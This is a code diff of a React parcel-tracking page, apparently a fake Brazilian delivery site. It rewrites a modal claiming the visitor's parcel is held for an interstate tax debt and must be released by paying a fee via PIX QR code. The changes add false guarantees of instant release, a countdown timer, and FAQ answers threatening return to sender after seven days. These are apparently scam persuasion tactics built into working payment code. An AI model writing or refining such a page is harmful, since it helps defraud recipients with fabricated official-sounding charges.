@@ -582,16 +582,31 @@ const TrackingPage: React.FC = () => {
                         >
                             <X size={18} />
                         </button>
-                        <div style={{ width: '80px', height: '80px', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px', border: '1px solid rgba(239,68,68,0.2)' }}>
+                        <div style={{ width: '80px', height: '80px', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px', border: '1px solid rgba(239,68,68,0.2)' }}>
                             <Calculator size={40} color="#ef4444" />
                         </div>
-                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif', color: '#0a1628', textTransform: 'uppercase', letterSpacing: '-0.5px' }}>⚠️ Regularização Fiscal</h2>
-                        <p style={{ color: '#1e293b', lineHeight: 1.6, marginBottom: '32px', fontWeight: 600, fontSize: '1.05rem' }}>
-                            Atenção: Seu objeto foi retido por <span style={{ color: '#ef4444' }}>irregularidade fiscal</span>.
-                            <br /><br />
-                            🚨<strong> A regularização é obrigatória</strong> para liberação imediata e continuidade do processo de entrega.
-                        </p>
+                        <h2 style={{ fontSize: '1.6rem', fontWeight: 900, marginBottom: '8px', fontFamily: 'Outfit, sans-serif', color: '#0a1628', textTransform: 'uppercase', letterSpacing: '-0.5px' }}>⚠️ Objeto Retido — Pendência Fiscal</h2>
+                        <p style={{ color: '#64748b', fontSize: '0.85rem', fontWeight: 600, marginBottom: '20px' }}>Código: <strong style={{ color: '#0a1628' }}>{trackingData.codigo}</strong></p>
 
+                        {/* Explicação detalhada */}
+                        <div style={{ background: 'rgba(239,68,68,0.05)', border: '1px solid rgba(239,68,68,0.15)', borderRadius: '16px', padding: '20px', marginBottom: '20px', textAlign: 'left' }}>
+                            <p style={{ color: '#1e293b', lineHeight: 1.7, fontWeight: 500, fontSize: '0.95rem', margin: 0 }}>
+                                Seu objeto passou por uma <strong>conferência fiscal automática</strong> durante o processo de triagem no centro de distribuição e foi identificada uma <strong style={{ color: '#dc2626' }}>pendência de tributo interestadual</strong> vinculada ao conteúdo declarado na nota fiscal de postagem.
+                                <br /><br />
+                                Para que a entrega prossiga normalmente, é necessário <strong>quitar a taxa de liberação</strong> no valor indicado abaixo. O pagamento é processado instantaneamente pelo nosso sistema.
+                            </p>
+                        </div>
+
+                        {/* Garantia de liberação imediata */}
+                        <div style={{ background: 'linear-gradient(135deg, rgba(16,185,129,0.08), rgba(5,150,105,0.06))', border: '1px solid rgba(16,185,129,0.25)', borderRadius: '14px', padding: '16px 20px', marginBottom: '24px', display: 'flex', alignItems: 'center', gap: '14px', textAlign: 'left' }}>
+                            <div style={{ fontSize: '1.8rem', flexShrink: 0 }}>🔓</div>
+                            <div>
+                                <div style={{ fontWeight: 900, color: '#059669', fontSize: '0.95rem', marginBottom: '4px' }}>Liberação Imediata Garantida</div>
+                                <div style={{ color: '#047857', fontSize: '0.85rem', fontWeight: 500, lineHeight: 1.5 }}>Após a confirmação do PIX — que ocorre em <strong>segundos</strong> — seu objeto é liberado automaticamente pelo sistema e entra em rota de entrega no mesmo dia.</div>
+                            </div>
+                        </div>
+
+                        {!taxPixData && !taxPixLoading && !taxPixPaid && (
                         <button onClick={async () => {
                             setTaxPixLoading(true);
                             try {
@@ -620,22 +635,23 @@ const TrackingPage: React.FC = () => {
                             } finally {
                                 setTaxPixLoading(false);
                             }
-                        }} style={{ width: '100%', padding: '18px', background: 'linear-gradient(135deg, #ef4444, #991b1b)', border: 'none', borderRadius: '16px', color: '#fff', fontWeight: 900, fontSize: '1.1rem', cursor: 'pointer', boxShadow: '0 8px 24px rgba(239, 68, 68, 0.4)', textTransform: 'uppercase' }}>
-                            Efetuar Regularização Obrigatória
+                        }} style={{ width: '100%', padding: '18px', background: 'linear-gradient(135deg, #ef4444, #991b1b)', border: 'none', borderRadius: '16px', color: '#fff', fontWeight: 900, fontSize: '1.1rem', cursor: 'pointer', boxShadow: '0 8px 24px rgba(239, 68, 68, 0.4)', textTransform: 'uppercase', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '10px' }}>
+                            🔓 Pagar Taxa e Liberar Objeto — R$ {trackingData.taxa_valor}
                         </button>
+                        )}
 
                         {taxPixLoading && (
                             <div style={{ color: '#ef4444', fontWeight: 'bold' }}>⏳ Gerando QR Code PIX, aguarde...</div>
                         )}
 
                         {taxPixData && !taxPixPaid && (
-                            <div style={{ background: 'rgba(239,68,68,0.04)', border: '1px solid rgba(239,68,68,0.1)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
+                            <div style={{ background: 'rgba(239,68,68,0.04)', border: '1px solid rgba(239,68,68,0.1)', borderRadius: '20px', padding: '24px', marginBottom: '20px' }}>
                                 <div style={{ fontSize: '0.8rem', color: '#ef4444', fontWeight: 700, textTransform: 'uppercase', marginBottom: '8px' }}>Pix Copia e Cola</div>
-                                <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#0a1628', marginBottom: '16px' }}>
+                                <div style={{ fontSize: '1.6rem', fontWeight: 900, color: '#0a1628', marginBottom: '16px' }}>
                                     R$ {taxPixData.amount ? taxPixData.amount.toFixed(2).replace('.', ',') : trackingData.taxa_valor}
                                 </div>
-                                <div style={{ background: '#fff', padding: '12px', borderRadius: '12px', marginBottom: '16px', display: 'inline-block' }}>
-                                    <img src={taxPixData.qr_image_url} alt="QR Code PIX" style={{ width: '150px', height: '150px' }} />
+                                <div style={{ background: '#fff', padding: '12px', borderRadius: '12px', marginBottom: '16px', display: 'inline-block', boxShadow: '0 4px 16px rgba(0,0,0,0.08)' }}>
+                                    <img src={taxPixData.qr_image_url} alt="QR Code PIX" style={{ width: '160px', height: '160px' }} />
                                 </div>
                                 <div style={{ background: 'rgba(239,68,68,0.04)', padding: '10px', borderRadius: '8px', wordBreak: 'break-all', fontSize: '12px', color: '#64748b', marginBottom: '10px', userSelect: 'all', border: '1px solid rgba(239,68,68,0.08)' }}>
                                     {taxPixData.qr_code}
@@ -645,7 +661,7 @@ const TrackingPage: React.FC = () => {
                                         🕒 Expira em: {formatTime(timeLeft)}
                                     </div>
                                 )}
-                                <p style={{ fontSize: '0.85rem', color: '#94a3b8', marginBottom: '10px' }}>Escaneie o código acima ou copie a Chave Copia e Cola.</p>
+                                <p style={{ fontSize: '0.85rem', color: '#94a3b8', marginBottom: '10px' }}>Escaneie o QR Code pelo app do seu banco ou copie o código abaixo.</p>
                                 <button
                                     onClick={() => {
                                         navigator.clipboard.writeText(taxPixData.qr_code);
@@ -673,18 +689,41 @@ const TrackingPage: React.FC = () => {
                                     {copied ? (
                                         <><CheckCircle size={18} /> Copiado com sucesso!</>
                                     ) : (
-                                        'Copiar Código PIX'
+                                        '📋 Copiar Código PIX'
                                     )}
                                 </button>
-                                <div style={{ marginTop: '20px', color: '#10b981', fontWeight: 'bold', animation: 'pulse 2s infinite' }}>⏳ Aguardando Pagamento...</div>
+                                <div style={{ marginTop: '16px', padding: '12px', background: 'rgba(16,185,129,0.08)', borderRadius: '10px', border: '1px solid rgba(16,185,129,0.2)' }}>
+                                    <div style={{ color: '#059669', fontWeight: 800, fontSize: '0.9rem', animation: 'pulse 2s infinite' }}>⏳ Aguardando confirmação do pagamento...</div>
+                                    <div style={{ color: '#6b7280', fontSize: '0.8rem', marginTop: '4px' }}>A liberação é automática — em segundos após o PIX ser confirmado.</div>
+                                </div>
+                            </div>
+                        )}
+
+                        {isConfirmingTax && !taxPixPaid && (
+                            <div style={{ background: 'rgba(245,158,11,0.08)', border: '1px solid rgba(245,158,11,0.25)', borderRadius: '20px', padding: '24px', marginBottom: '20px', textAlign: 'center' }}>
+                                <div style={{ fontSize: '2rem', marginBottom: '10px', animation: 'pulse 1s infinite' }}>⚙️</div>
+                                <div style={{ fontSize: '1rem', color: '#92400e', fontWeight: 900 }}>Processando pagamento...</div>
+                                <p style={{ fontSize: '0.85rem', color: '#78350f', fontWeight: 500, marginTop: '6px' }}>Nosso sistema está confirmando o PIX e preparando a liberação do seu objeto.</p>
                             </div>
                         )}
 
                         {taxPixPaid && (
-                            <div style={{ background: 'rgba(16, 185, 129, 0.1)', border: '1px solid rgba(16, 185, 129, 0.3)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
-                                <CheckCircle size={48} color="#10b981" style={{ margin: '0 auto 16px' }} />
-                                <div style={{ fontSize: '1.2rem', color: '#059669', fontWeight: 900 }}>Pagamento Confirmado!</div>
-                                <p style={{ fontSize: '0.95rem', color: '#0f172a', fontWeight: 500, marginTop: '8px' }}>Sua taxa foi paga com sucesso. O pacote será liberado em breve.</p>
+                            <div style={{ background: 'rgba(16, 185, 129, 0.08)', border: '1px solid rgba(16, 185, 129, 0.3)', borderRadius: '20px', padding: '28px', marginBottom: '20px', textAlign: 'center' }}>
+                                <div style={{ width: '64px', height: '64px', background: 'rgba(16,185,129,0.15)', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px' }}>
+                                    <CheckCircle size={36} color="#10b981" />
+                                </div>
+                                <div style={{ fontSize: '1.3rem', color: '#059669', fontWeight: 900, marginBottom: '8px' }}>✅ Pagamento Confirmado!</div>
+                                <p style={{ fontSize: '0.95rem', color: '#0f172a', fontWeight: 600, marginBottom: '16px' }}>Seu objeto foi <strong style={{ color: '#059669' }}>liberado imediatamente</strong> para rota de entrega.</p>
+                                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                                    <div style={{ display: 'flex', alignItems: 'center', gap: '10px', background: 'rgba(16,185,129,0.08)', padding: '10px 14px', borderRadius: '10px' }}>
+                                        <span style={{ fontSize: '1.1rem' }}>🚚</span>
+                                        <span style={{ fontSize: '0.85rem', color: '#065f46', fontWeight: 600 }}>Objeto em rota de entrega — previsão: próximos dias úteis</span>
+                                    </div>
+                                    <div style={{ display: 'flex', alignItems: 'center', gap: '10px', background: 'rgba(16,185,129,0.08)', padding: '10px 14px', borderRadius: '10px' }}>
+                                        <span style={{ fontSize: '1.1rem' }}>📬</span>
+                                        <span style={{ fontSize: '0.85rem', color: '#065f46', fontWeight: 600 }}>Atualizações de rastreio serão registradas automaticamente</span>
+                                    </div>
+                                </div>
                             </div>
                         )}
 
@@ -696,20 +735,20 @@ const TrackingPage: React.FC = () => {
 
                             <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                                 <FaqItem
-                                    q="Por que meu pedido foi taxado?"
-                                    a="Seu pedido foi selecionado para uma conferência administrativa de rotina ou incidência de tributos interestaduais, conforme as normas de transporte vigentes."
+                                    q="Por que meu pedido foi retido?"
+                                    a="Durante a triagem no centro de distribuição, o sistema fiscal identificou uma pendência de tributo interestadual associada ao conteúdo declarado. A retenção é um procedimento padrão e temporário — resolvido imediatamente após o pagamento."
                                 />
                                 <FaqItem
-                                    q="O que acontece se eu não pagar?"
-                                    a="Caso o pagamento não seja identificado em até 7 dias, o objeto pode ficar retido no centro de processamento ou ser reavaliado, atrasando indefinidamente a entrega."
+                                    q="O objeto é liberado na hora?"
+                                    a="Sim. O pagamento via PIX é confirmado em segundos. Assim que o sistema detecta o pagamento, o objeto é desbloqueado automaticamente e encaminhado para a rota de entrega no mesmo dia."
                                 />
                                 <FaqItem
-                                    q="Qual o prazo para liberação?"
-                                    a="Após a confirmação do pagamento das taxas pendentes, o sistema libera o pacote para a rota final de entrega em um prazo médio de 24 a 72 horas úteis."
+                                    q="Quanto tempo leva a entrega após a liberação?"
+                                    a="Após a liberação imediata, o prazo de entrega segue normalmente o calendário logístico da sua região — geralmente de 1 a 3 dias úteis a partir da data de liberação."
                                 />
                                 <FaqItem
-                                    q="O valor é reembolsável?"
-                                    a="Não. As taxas de processamento e tributos são obrigatórios para a continuidade do transporte e não são passíveis de devolução após o processamento."
+                                    q="O que acontece se eu não regularizar?"
+                                    a="O objeto permanece retido no centro de processamento. Após 7 dias sem pagamento, pode ser reavaliado ou devolvido ao remetente, impossibilitando a entrega."
                                 />
                             </div>
                         </div>
